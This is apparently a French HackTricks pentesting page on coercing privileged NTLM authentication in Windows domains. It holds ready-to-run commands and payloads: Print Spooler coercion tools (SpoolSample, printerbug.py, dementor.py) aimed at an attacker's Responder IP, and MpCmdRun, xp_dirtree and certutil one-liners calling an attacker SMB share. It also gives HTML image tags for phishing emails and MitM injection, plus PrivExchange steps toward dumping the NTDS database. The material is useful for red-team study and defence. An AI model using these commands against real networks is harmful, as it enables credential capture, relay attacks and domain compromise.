# Forcer l'authentification privilégiée NTLM

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Travaillez-vous dans une **entreprise de cybersécurité**? Vous voulez voir votre **entreprise annoncée dans HackTricks**? ou voulez-vous avoir accès à la **dernière version du PEASS ou télécharger HackTricks en PDF**? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) est une **collection** de **déclencheurs d'authentification à distance** codés en C# en utilisant le compilateur MIDL pour éviter les dépendances tierces.

## Abus du service Spouleur

Si le service _**Spouleur d'impression**_ est **activé**, vous pouvez utiliser des informations d'identification AD déjà connues pour **demander** au serveur d'impression du contrôleur de domaine une **mise à jour** sur les nouveaux travaux d'impression et lui dire simplement de **envoyer la notification à un système**.\
Notez que lorsque l'imprimante envoie la notification à des systèmes arbitraires, elle doit s'**authentifier contre** ce **système**. Par conséquent, un attaquant peut faire en sorte que le service _**Spouleur d'impression**_ s'authentifie contre un système arbitraire, et le service **utilisera le compte de l'ordinateur** dans cette authentification.

### Recherche de serveurs Windows sur le domaine

En utilisant PowerShell, obtenez une liste de machines Windows. Les serveurs sont généralement prioritaires, alors concentrons-nous là-dessus:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Recherche des services Spooler en écoute

En utilisant une version légèrement modifiée de @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), vérifiez si le service Spooler est en écoute :
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Vous pouvez également utiliser rpcdump.py sur Linux et rechercher le protocole MS-RPRN.
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
### Demander au service de s'authentifier contre un hôte arbitraire

Vous pouvez compiler [**SpoolSample à partir d'ici**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ou utilisez [**dementor.py de 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si vous êtes sur Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
### Combinaison avec la Délégation sans contrainte

Si un attaquant a déjà compromis un ordinateur avec la [Délégation sans contrainte](unconstrained-delegation.md), l'attaquant pourrait **faire authentifier l'imprimante contre cet ordinateur**. En raison de la délégation sans contrainte, le **TGT** du **compte d'ordinateur de l'imprimante** sera **enregistré dans** la **mémoire** de l'ordinateur avec délégation sans contrainte. Comme l'attaquant a déjà compromis cet hôte, il pourra **récupérer ce ticket** et l'exploiter ([Pass the Ticket](pass-the-ticket.md)).

## Authentification forcée RCP

{% embed url="https://github.com/p0dalirius/Coercer" %}

## PrivExchange

L'attaque `PrivExchange` est le résultat d'une faille trouvée dans la fonctionnalité **PushSubscription du serveur Exchange**. Cette fonctionnalité permet au serveur Exchange d'être forcé par n'importe quel utilisateur de domaine avec une boîte aux lettres de s'authentifier sur n'importe quel hôte fourni par le client via HTTP.

Par défaut, le **service Exchange s'exécute en tant que SYSTEM** et se voit accorder des privilèges excessifs (en particulier, il a **des privilèges WriteDacl sur la pré-mise à jour cumulative 2019 du domaine**). Cette faille peut être exploitée pour permettre le **relais d'informations vers LDAP et extraire ensuite la base de données NTDS du domaine**. Dans les cas où le relais vers LDAP n'est pas possible, cette faille peut toujours être utilisée pour relayer et s'authentifier sur d'autres hôtes dans le domaine. L'exploitation réussie de cette attaque accorde un accès immédiat à l'administrateur de domaine avec n'importe quel compte utilisateur de domaine authentifié.

## À l'intérieur de Windows

Si vous êtes déjà à l'intérieur de la machine Windows, vous pouvez forcer Windows à se connecter à un serveur en utilisant des comptes privilégiés avec :

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
Ou utilisez cette autre technique: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Il est possible d'utiliser le lolbin certutil.exe (binaire signé par Microsoft) pour forcer l'authentification NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## Injection HTML

### Via email

Si vous connaissez l'**adresse e-mail** de l'utilisateur qui se connecte à une machine que vous souhaitez compromettre, vous pourriez simplement lui envoyer un **e-mail avec une image de 1x1 pixel** comme suit:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
et lorsqu'il l'ouvre, il essaiera de s'authentifier.

### MitM

Si vous pouvez effectuer une attaque MitM sur un ordinateur et injecter du HTML dans une page qu'il visualisera, vous pourriez essayer d'injecter une image comme celle-ci dans la page :
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Casser NTLMv1

Si vous pouvez capturer [les défis NTLMv1 lisez ici comment les casser](../ntlm/#ntlmv1-attack).\
_Rappelez-vous que pour casser NTLMv1, vous devez définir le défi Responder sur "1122334455667788"_
